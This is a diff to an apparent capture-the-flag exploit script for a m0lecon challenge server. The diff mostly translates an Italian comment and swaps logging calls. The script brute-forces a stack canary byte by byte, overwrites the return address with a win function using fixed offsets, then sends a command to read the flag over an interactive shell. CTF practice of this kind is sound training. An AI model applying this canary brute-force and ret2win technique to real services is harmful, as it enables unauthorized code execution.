@@ -5,7 +5,7 @@ import time
 #HOST, PORT = '127.0.0.1', 4444
 HOST, PORT = 'offsec.m0lecon.it', 13521
 # canary of this instance 0x17e7d3d2f1a4b000
-OFFSET_TO_CANARY = 72 #trovato con cyclic. il break andava messo in read_data. usato nc inviare l'input al server aperto con gdb
+OFFSET_TO_CANARY = 72 #found with cyclic. the break had to be set in read_data. used nc to send the input to the server opened with gdb
 OFFSET_TO_RIP = 88
 win_addr = 0x00401530
 ret_addr = 0x000000000040101a
@@ -30,10 +30,10 @@ for i in range(7):
 
         if b"OK" in data:
             known = guess
-            log.success(f"byte {i+1}: {bval:02x}")
+            print(f"byte {i+1}: {bval:02x}")
             break
 canary = u64(known)
-log.info(f"Canary: {canary:#x}")
+print(f"Canary: {canary:#x}")
 
 io = remote(HOST, PORT)
 io.recvuntil(b"wish\n")
@@ -47,7 +47,6 @@ payload = flat(
 )
 io.send(payload)
 
-# utile per mandare un comando invece di digitarlo a mano
 sleep(0.5)
 io.sendline(b'cat /home/user/flag')
 io.interactive()
